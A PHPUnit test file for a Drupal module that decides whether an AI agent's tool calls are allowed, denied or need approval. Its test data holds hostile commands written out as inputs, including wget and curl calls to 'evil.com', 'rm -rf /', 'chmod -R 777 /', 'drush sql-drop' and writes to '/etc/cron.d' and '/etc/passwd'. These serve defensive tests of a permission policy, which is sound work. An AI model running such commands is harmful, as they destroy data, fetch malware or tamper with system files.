<?php

declare(strict_types=1);

namespace Drupal\Tests\ai_claude_agent_sdk\Unit;

use Drupal\ai_claude_agent_sdk\Entity\AgentProfileInterface;
use Drupal\ai_claude_agent_sdk\Service\PolicyDecision;
use Drupal\ai_claude_agent_sdk\Service\PolicyEvaluator;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * Tests for PolicyEvaluator and PolicyDecision.
 *
 * @group ai_claude_agent_sdk
 */
class PolicyEvaluatorTest extends TestCase {

  public function testAllowDecision(): void {
    $decision = PolicyDecision::allow('test reason');
    $this->assertSame('allow', $decision->decision);
    $this->assertSame('test reason', $decision->reason);
  }

  public function testDenyDecision(): void {
    $decision = PolicyDecision::deny('blocked');
    $this->assertSame('deny', $decision->decision);
    $this->assertSame('blocked', $decision->reason);
  }

  public function testAskDecision(): void {
    $decision = PolicyDecision::ask('needs approval');
    $this->assertSame('ask', $decision->decision);
    $this->assertSame('needs approval', $decision->reason);
  }

  private function createMockProfile(string $tier, array $overrides = []): AgentProfileInterface {
    $profile = $this->createMock(AgentProfileInterface::class);
    $profile->method('getSecurityTier')->willReturn($tier);
    $profile->method('getAllowedTools')->willReturn($overrides['allowed_tools'] ?? []);
    $profile->method('getDeniedTools')->willReturn($overrides['denied_tools'] ?? []);
    $profile->method('getBashAllowPatterns')->willReturn($overrides['bash_allow_patterns'] ?? []);
    $profile->method('getBashDenyPatterns')->willReturn($overrides['bash_deny_patterns'] ?? []);
    $profile->method('getWorkingDirectory')->willReturn($overrides['working_directory'] ?? '/var/www/html');
    $profile->method('getAllowedDirectories')->willReturn($overrides['allowed_directories'] ?? []);
    return $profile;
  }

  #[DataProvider('bridgeCommandProvider')]
  public function testBridgeCommandDetection(string $command, string $expectedDecision): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('strict');
    $decision = $evaluator->evaluate('Bash', ['command' => $command], 'PreToolUse', $profile);
    $this->assertSame($expectedDecision, $decision->decision, "Bridge detection for '$command'");
  }

  public static function bridgeCommandProvider(): array {
    return [
      'drush bridge command' => ['drush ai-claude-agent-sdk:tool-run entity_create node', 'allow'],
      'ddev drush bridge' => ['ddev drush ai-claude-agent-sdk:tool-run views_search', 'allow'],
      'ddev exec drush bridge' => ['ddev exec drush ai-claude-agent-sdk:tool-run content_list', 'allow'],
      'not a bridge command' => ['ls -la', 'deny'],
      'partial match' => ['drush ai-claude-agent-sdk:other-thing', 'deny'],
      'empty command' => ['', 'deny'],
    ];
  }

  #[DataProvider('readHelperProvider')]
  public function testReadHelperDetection(string $command, string $expectedDecision): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('standard');
    $decision = $evaluator->evaluate('Bash', ['command' => $command], 'PreToolUse', $profile);
    $this->assertSame($expectedDecision, $decision->decision, "Read helper detection for '$command'");
  }

  public static function readHelperProvider(): array {
    return [
      'ls command' => ['ls -la /var', 'allow'],
      'pwd command' => ['pwd', 'allow'],
      'cat command' => ['cat /etc/hosts', 'allow'],
      'head command' => ['head -n 10 file.txt', 'allow'],
      'tail command' => ['tail -f log.txt', 'allow'],
      'wc command' => ['wc -l file.txt', 'allow'],
      // These no longer return 'ask' — they auto-resolve via boundary check.
      // No absolute paths → allow (wasAsk=TRUE).
      'git command' => ['git push --force', 'allow'],
      'empty command' => ['', 'allow'],
    ];
  }

  #[DataProvider('dangerousCommandProvider')]
  public function testDangerousCommandDetection(string $command, string $expectedDecision): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('permissive');
    $decision = $evaluator->evaluate('Bash', ['command' => $command], 'PreToolUse', $profile);
    $this->assertSame($expectedDecision, $decision->decision, "Dangerous detection for '$command'");
  }

  public static function dangerousCommandProvider(): array {
    return [
      'rm -rf root' => ['rm -rf /', 'deny'],
      'git force push' => ['git push --force origin main', 'deny'],
      'git reset hard' => ['git reset --hard HEAD~5', 'deny'],
      'drush sql-drop' => ['drush sql-drop -y', 'deny'],
      'drush site install' => ['drush site:install standard', 'deny'],
      'chmod 777' => ['chmod -R 777 /', 'deny'],
      'safe ls' => ['ls -la', 'allow'],
      'safe git push' => ['git push origin main', 'allow'],
      'safe rm single file' => ['rm file.txt', 'allow'],
      'empty' => ['', 'allow'],
    ];
  }

  public function testBashAllowPatternsAddReadHelpers(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('standard', [
      'bash_allow_patterns' => ['find . -name'],
    ]);
    $decision = $evaluator->evaluate('Bash', ['command' => 'find . -name "*.php"'], 'PreToolUse', $profile);
    $this->assertSame('allow', $decision->decision);
  }

  public function testDefaultReadHelpersStillApplyWithEmptyAllowPatterns(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('standard');
    $decision = $evaluator->evaluate('Bash', ['command' => 'cat /etc/hosts'], 'PreToolUse', $profile);
    $this->assertSame('allow', $decision->decision);
  }

  public function testBashDenyPatternsAddDangerousPatterns(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('permissive', [
      'bash_deny_patterns' => ['wget '],
    ]);
    $decision = $evaluator->evaluate('Bash', ['command' => 'wget http://evil.com/malware'], 'PreToolUse', $profile);
    $this->assertSame('deny', $decision->decision);
  }

  public function testDefaultDangerousPatternsStillApplyWithEmptyDenyPatterns(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('permissive');
    $decision = $evaluator->evaluate('Bash', ['command' => 'drush sql-drop -y'], 'PreToolUse', $profile);
    $this->assertSame('deny', $decision->decision);
  }

  public function testBashAllowAndDenyPatternsWorkTogether(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('permissive', [
      'bash_deny_patterns' => ['curl '],
    ]);
    $decision = $evaluator->evaluate('Bash', ['command' => 'curl http://evil.com'], 'PreToolUse', $profile);
    $this->assertSame('deny', $decision->decision);
    $decision = $evaluator->evaluate('Bash', ['command' => 'ls -la'], 'PreToolUse', $profile);
    $this->assertSame('allow', $decision->decision);
  }

  public function testPostToolUseAlwaysAllows(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('strict');
    $decision = $evaluator->evaluate('Bash', ['command' => 'rm -rf /'], 'PostToolUse', $profile);
    $this->assertSame('allow', $decision->decision);
    $this->assertSame('PostToolUse: logged for audit', $decision->reason);
  }

  public function testUnknownTierDenies(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('nonexistent');
    $decision = $evaluator->evaluate('Read', [], 'PreToolUse', $profile);
    $this->assertSame('deny', $decision->decision);
    $this->assertStringContainsString('Unknown tier', $decision->reason);
  }

  public function testStrictPolicyEvaluation(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('strict');

    // Read-only tools allowed.
    $this->assertSame('allow', $evaluator->evaluate('Read', [], 'PreToolUse', $profile)->decision);
    $this->assertSame('allow', $evaluator->evaluate('Glob', [], 'PreToolUse', $profile)->decision);
    $this->assertSame('allow', $evaluator->evaluate('Grep', [], 'PreToolUse', $profile)->decision);
    $this->assertSame('allow', $evaluator->evaluate('LS', [], 'PreToolUse', $profile)->decision);

    // Bridge Bash allowed.
    $this->assertSame('allow', $evaluator->evaluate('Bash', ['command' => 'drush ai-claude-agent-sdk:tool-run entity_create node'], 'PreToolUse', $profile)->decision);

    // Non-bridge Bash denied.
    $this->assertSame('deny', $evaluator->evaluate('Bash', ['command' => 'ls -la'], 'PreToolUse', $profile)->decision);

    // Write tools denied.
    $this->assertSame('deny', $evaluator->evaluate('Edit', [], 'PreToolUse', $profile)->decision);
    $this->assertSame('deny', $evaluator->evaluate('Write', [], 'PreToolUse', $profile)->decision);
  }

  public function testStandardPolicyEvaluation(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('standard');

    // Read tools allowed.
    $this->assertSame('allow', $evaluator->evaluate('Read', [], 'PreToolUse', $profile)->decision);

    // Bridge Bash allowed.
    $this->assertSame('allow', $evaluator->evaluate('Bash', ['command' => 'drush ai-claude-agent-sdk:tool-run entity_create node'], 'PreToolUse', $profile)->decision);

    // Read helper Bash allowed.
    $this->assertSame('allow', $evaluator->evaluate('Bash', ['command' => 'ls -la'], 'PreToolUse', $profile)->decision);

    // Write tools with no file_path auto-approve (empty paths → within boundary).
    $this->assertSame('allow', $evaluator->evaluate('Edit', [], 'PreToolUse', $profile)->decision);
    $this->assertSame('allow', $evaluator->evaluate('Write', [], 'PreToolUse', $profile)->decision);
    $this->assertSame('allow', $evaluator->evaluate('NotebookEdit', [], 'PreToolUse', $profile)->decision);

    // Unknown Bash with no absolute paths auto-approves.
    $this->assertSame('allow', $evaluator->evaluate('Bash', ['command' => 'git commit -m "test"'], 'PreToolUse', $profile)->decision);

    // Unknown tool auto-denies (no interactive channel).
    $this->assertSame('deny', $evaluator->evaluate('SomeNewTool', [], 'PreToolUse', $profile)->decision);
  }

  public function testPermissivePolicyEvaluation(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('permissive');

    // Normal tools allowed.
    $this->assertSame('allow', $evaluator->evaluate('Read', [], 'PreToolUse', $profile)->decision);
    $this->assertSame('allow', $evaluator->evaluate('Edit', [], 'PreToolUse', $profile)->decision);
    $this->assertSame('allow', $evaluator->evaluate('Bash', ['command' => 'git commit -m "test"'], 'PreToolUse', $profile)->decision);

    // Dangerous commands denied.
    $this->assertSame('deny', $evaluator->evaluate('Bash', ['command' => 'rm -rf /'], 'PreToolUse', $profile)->decision);
    $this->assertSame('deny', $evaluator->evaluate('Bash', ['command' => 'git push --force origin main'], 'PreToolUse', $profile)->decision);
  }

  public function testBashWithMissingCommandKeyDeniesInStrict(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('strict');
    // No 'command' key in toolInput — falls back to empty string, not a bridge command.
    $decision = $evaluator->evaluate('Bash', [], 'PreToolUse', $profile);
    $this->assertSame('deny', $decision->decision);
  }

  public function testReadHelperDetectsStandaloneLsButNotLsblk(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('standard');
    // Standalone 'ls' should be allowed (matches 'ls ' prefix via equality).
    $this->assertSame('allow', $evaluator->evaluate('Bash', ['command' => 'ls'], 'PreToolUse', $profile)->decision);
    // 'lsblk' is NOT a read helper, but has no absolute paths so auto-approves.
    $this->assertSame('allow', $evaluator->evaluate('Bash', ['command' => 'lsblk'], 'PreToolUse', $profile)->decision);
  }

  public function testCustomPolicyEvaluation(): void {
    $evaluator = new PolicyEvaluator();

    // Custom with allowlist.
    $profile = $this->createMockProfile('custom', [
      'allowed_tools' => ['Read', 'Grep'],
    ]);
    $this->assertSame('allow', $evaluator->evaluate('Read', [], 'PreToolUse', $profile)->decision);
    $this->assertSame('deny', $evaluator->evaluate('Edit', [], 'PreToolUse', $profile)->decision);

    // Custom with denylist — deny takes precedence.
    $profile = $this->createMockProfile('custom', [
      'allowed_tools' => ['Read', 'Bash'],
      'denied_tools' => ['Bash'],
    ]);
    $this->assertSame('allow', $evaluator->evaluate('Read', [], 'PreToolUse', $profile)->decision);
    $this->assertSame('deny', $evaluator->evaluate('Bash', ['command' => 'ls'], 'PreToolUse', $profile)->decision);

    // Custom with empty lists — everything allowed.
    $profile = $this->createMockProfile('custom');
    $this->assertSame('allow', $evaluator->evaluate('Bash', ['command' => 'anything'], 'PreToolUse', $profile)->decision);
  }

  // -------------------------------------------------------------------------
  // PolicyDecision wasAsk tests.
  // -------------------------------------------------------------------------

  public function testPolicyDecisionWasAskDefault(): void {
    $decision = PolicyDecision::allow('test');
    $this->assertFalse($decision->wasAsk);
  }

  public function testPolicyDecisionAllowWithWasAsk(): void {
    $decision = PolicyDecision::allow('test', wasAsk: TRUE);
    $this->assertTrue($decision->wasAsk);
  }

  // -------------------------------------------------------------------------
  // Bash boundary resolution tests.
  // -------------------------------------------------------------------------

  public function testStandardBashAskAutoResolvesAllowWithinDirectory(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('standard', [
      'working_directory' => '/var/www/html',
    ]);
    // Bash command containing a path inside working dir.
    $decision = $evaluator->evaluate('Bash', ['command' => 'touch /var/www/html/test.txt'], 'PreToolUse', $profile);
    $this->assertSame('allow', $decision->decision);
    $this->assertTrue($decision->wasAsk);
  }

  public function testStandardBashAskAutoResolvesDenyOutsideDirectory(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('standard', [
      'working_directory' => '/var/www/html',
    ]);
    // Bash command targeting a path outside the working dir.
    $decision = $evaluator->evaluate('Bash', ['command' => 'rm /etc/passwd'], 'PreToolUse', $profile);
    $this->assertSame('deny', $decision->decision);
    $this->assertTrue($decision->wasAsk);
  }

  // -------------------------------------------------------------------------
  // Write tool boundary resolution tests.
  // -------------------------------------------------------------------------

  public function testStandardWriteAskAutoResolvesAllowWithinDirectory(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('standard', [
      'working_directory' => '/var/www/html',
      'allowed_directories' => ['/tmp/workspace'],
    ]);
    // Edit with file_path inside an allowed directory.
    $decision = $evaluator->evaluate('Edit', ['file_path' => '/tmp/workspace/file.php'], 'PreToolUse', $profile);
    $this->assertSame('allow', $decision->decision);
    $this->assertTrue($decision->wasAsk);
  }

  public function testStandardWriteAskAutoResolvesDenyOutsideDirectory(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('standard', [
      'working_directory' => '/var/www/html',
    ]);
    // Edit targeting a path outside allowed boundaries.
    $decision = $evaluator->evaluate('Edit', ['file_path' => '/etc/cron.d/evil'], 'PreToolUse', $profile);
    $this->assertSame('deny', $decision->decision);
    $this->assertTrue($decision->wasAsk);
  }

  // -------------------------------------------------------------------------
  // Unknown tool / no-path boundary tests.
  // -------------------------------------------------------------------------

  public function testStandardUnknownToolAutoResolvesDeny(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('standard');
    $decision = $evaluator->evaluate('SomeNewTool', [], 'PreToolUse', $profile);
    $this->assertSame('deny', $decision->decision);
    $this->assertTrue($decision->wasAsk);
  }

  public function testStandardBashNoPaths(): void {
    $evaluator = new PolicyEvaluator();
    $profile = $this->createMockProfile('standard', [
      'working_directory' => '/var/www/html',
    ]);
    // Bash command with no absolute paths → auto-approved (assumed within working dir).
    $decision = $evaluator->evaluate('Bash', ['command' => 'git status'], 'PreToolUse', $profile);
    $this->assertSame('allow', $decision->decision);
    $this->assertTrue($decision->wasAsk);
  }

}
